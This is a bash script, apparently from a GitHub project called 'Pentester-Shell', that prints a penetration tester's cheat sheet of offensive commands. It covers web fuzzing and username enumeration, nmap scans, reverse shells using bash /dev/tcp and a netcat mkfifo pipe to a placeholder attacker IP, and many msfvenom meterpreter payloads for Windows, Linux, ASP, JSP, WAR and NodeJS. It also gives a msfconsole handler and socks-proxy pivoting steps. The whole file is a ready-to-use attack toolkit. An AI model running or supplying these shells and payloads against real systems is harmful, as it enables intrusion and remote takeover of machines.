# Author Frank4o4
# https://github.com/frank4o4/Pentester-Shell



# Define Colours
red=$'\e[1;31m'
grn=$'\e[1;32m'
yel=$'\e[1;33m'
blu=$'\e[1;34m'
mag=$'\e[1;35m'
cyn=$'\e[1;36m'
end=$'\e[0m'



# Web Page Fuzz options

fuzz()
{

printf "${red}wfuzz example of trying to find valid users ${end}\n";
printf "${grn}wfuzz -c -w /usr/share/seclists/Usernames/Names/names.txt --hs No account found with that username. -d username=FUZZ&password=password http://192.168.x.x/login.php ${end}\n\n";

printf "${red}GoBuster ${end}\n";
printf "${grn}gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://192.168.x.x -k -x txt,php,html -t 40 ${end} \n\n";


printf "${red}Dirb ${end}\n";
printf "${grn}dirb http://192.168.x.x -X .php,html,txt ${end} \n\n";


printf "${red}whatweb${end}\n"
printf "${grn}whatweb [IP]:[PORT] --color=never --log-brief=[OUTPUT].txt ${end}\n\n";

printf "${red}Nikto Scan ${end}\n";
printf "${grn}nikto -host=http://192.168.x.x ${end}\n\n";

printf "${red}WebDav ${end}\n";
printf "${grn}davtest -url http://192.168.x.x ${end}\n\n";

}


# NMAP options

scan()
{

printf "${red}Scan all Ports and output file ${end}\n";
printf "${grn}nmap -p- -sC -sV -o nmap.out 192.168.x.x ${end}\n\n";

printf "${red}Scan UDP ${end}\n";
printf "${grn}sudo nmap -sS -sU 192.168.x.x ${end}\n\n";


}



# Reverse Shell Options
revshell()
{

printf "${red}Clean Shell using Python on Linux ${end}\n";

printf "${grn}python -c 'import pty; pty.spawn("/bin/bash")' \n";
printf "python3 -c 'import pty; pty.spawn("/bin/bash")' ${end}\n\n";


printf "${red}Bash Reverse Shell ${end}\n";

printf "${grn}bash -i >& /dev/tcp/192.168.x.x/8080 0>&1 ${end}\n\n";


printf "${red}Simple shell ${end}\n";
printf "${grn}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.x.x 443 >/tmp/f ${end}\n\n";

}

metasploit()
{


printf "${red}Windows${end}\n";
printf "${grn}msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe\n";
printf "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe \n";
printf "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe \n";
printf "msfvenom -p windows/x64/meterpreter/reverse_http LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe \n";
printf "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f csharp \n";
printf "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f vbapplication \n";
printf "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f ps1 ${end}\n\n\n";

printf "${red}Linux${end}\n";
printf "${grn}msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf \n";
printf "msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf ${end}\n\n\n";


printf "${red}ASP ${end}\n";
printf "${grn}msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp\n";
printf "msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx ${end}\n\n\n";


printf "${red}JSP ${end}\n";
printf "${grn}msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp ${end}\n\n\n";


printf "${red}WAR ${end}\n";
printf "${grn}msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war ${end} \n\n\n";

printf "${red}NODEJS ${end}\n";
printf "${grn}msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) ${end}\n\n\n";



printf "${red}MSFCONSOLE ${end}\n";
printf "${grn}sudo msfconsole -q -x \"use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 192.168.x.x; set LPORT 443; exploit\" ${end}\n\n\n ";


printf "${red}Socket Proxy${end} \n";
printf "${grn}use multi/manage/autoroute \n set session 1 \n exploit \n";
printf "use auxiliary/server/socks_proxy \n set srvhost 127.0.0.1 \n exploit -j ${end}\n\n\n";

}
